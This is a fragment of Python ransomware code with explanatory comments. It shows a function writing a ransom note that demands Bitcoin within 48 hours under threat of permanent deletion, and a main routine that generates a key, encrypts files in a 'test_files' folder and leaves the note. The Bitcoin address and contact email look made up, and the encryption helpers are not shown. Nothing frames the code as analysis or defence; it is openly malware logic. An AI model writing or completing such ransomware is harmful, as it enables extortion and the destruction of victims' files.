        ransom_note.write("Your files have been encrypted. To recover them, send 1 Bitcoin to the following address: V1T0Ri141sTh#Bigg3T3amFo4Br@z1l. Contact us at 1899@lionofbarra.com for further instructions.\n")
        ransom_note.write("Make this payment within 48 hours, or your files will be permanently deleted.\n")
# The create_ransom_note function creates a ransom note in a text file named "ransom_note.txt". The note contains instructions for the victim on how to recover their files, including a Bitcoin address for payment and a contact email.

def main():
    generate_key()
    key = load_key()
    files_to_encrypt = find_files("test_files")
    for file in files_to_encrypt:
        encrypt_file(file, key)
    create_ransom_note()
